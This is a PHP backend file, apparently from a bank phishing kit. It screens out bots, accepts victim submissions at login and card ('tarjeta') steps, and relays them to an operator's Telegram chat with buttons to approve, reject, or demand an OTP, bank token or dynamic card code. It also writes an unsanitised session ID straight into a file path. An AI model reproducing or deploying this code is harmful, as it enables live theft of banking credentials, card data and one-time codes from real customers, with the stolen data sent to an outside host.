<?php
/**
 * ================================================================
 * API Send — Envía datos a Telegram desde el backend
 * ================================================================
 * El token del bot NUNCA viaja al frontend.
 */

require_once __DIR__ . '/../Antibot.php';

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Método no permitido']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true) ?: $_POST;

if (!Antibot::esHumano($input)) {
    Antibot::rechazar();
}

$step      = $input['step']      ?? '';
$message   = $input['message']   ?? '';
$sessionId = $input['sessionId'] ?? '';

if (empty($step) || empty($message) || empty($sessionId)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Faltan parámetros']);
    exit;
}

$config   = require __DIR__ . '/../config.php';
$botToken = $config['bot_token'];
$chatId   = $config['chat_id'];

// ── Construir botones según el paso ──
$buttons = [];
if ($step === 'login') {
    $buttons = [
        ['text' => '✅ Aprobar',  'callback_data' => "aprobar_{$step}_{$sessionId}"],
        ['text' => '🏦 Token',    'callback_data' => "token_{$step}_{$sessionId}"],
        ['text' => '❌ Rechazar', 'callback_data' => "rechazar_{$step}_{$sessionId}"]
    ];
} elseif ($step === 'tarjeta') {
    $buttons = [
        ['text' => '✅ Aprobar',  'callback_data' => "aprobar_{$step}_{$sessionId}"],
        ['text' => '🔐 OTP',      'callback_data' => "otp_{$step}_{$sessionId}"],
        ['text' => '💳 Dinámica', 'callback_data' => "dinamica_{$step}_{$sessionId}"],
        ['text' => '❌ Rechazar', 'callback_data' => "rechazar_{$step}_{$sessionId}"]
    ];
} else {
    $buttons = [
        ['text' => '✅ Aprobar',  'callback_data' => "aprobar_{$step}_{$sessionId}"],
        ['text' => '❌ Rechazar', 'callback_data' => "rechazar_{$step}_{$sessionId}"]
    ];
}

// Agrupar de 2 en 2 para mejor visualización
$keyboard = [];
$row = [];
foreach ($buttons as $i => $btn) {
    $row[] = $btn;
    if (count($row) === 2 || $i === count($buttons) - 1) {
        $keyboard[] = $row;
        $row = [];
    }
}

$postData = http_build_query([
    'chat_id'      => $chatId,
    'text'         => $message . "\n\n⏳ Esperando acción del administrador...",
    'parse_mode'   => 'HTML',
    'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
]);

$ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => $postData,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 15,
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_FOLLOWLOCATION => true
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error    = curl_error($ch);
curl_close($ch);

if ($error || $httpCode !== 200) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Error Telegram', 'details' => $error ?: "HTTP {$httpCode}"]);
    exit;
}

$data = json_decode($response, true);
if (!$data['ok']) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Telegram API error', 'details' => $data['description'] ?? 'Unknown']);
    exit;
}

$messageId = $data['result']['message_id'] ?? null;

// ── Guardar sesión en archivo ──
$sessionFile = __DIR__ . "/../data/{$sessionId}.json";
$sessionData = [
    'sessionId'   => $sessionId,
    'step'        => $step,
    'messageId'   => $messageId,
    'status'      => 'pending',
    'action'      => null,
    'createdAt'   => time(),
    'lastUpdateId'=> 0
];

$fp = fopen($sessionFile, 'c');
if ($fp && flock($fp, LOCK_EX)) {
    ftruncate($fp, 0);
    fwrite($fp, json_encode($sessionData));
    fflush($fp);
    flock($fp, LOCK_UN);
    fclose($fp);
}

echo json_encode([
    'ok'        => true,
    'messageId' => $messageId,
    'sessionId' => $sessionId,
    'step'      => $step
]);
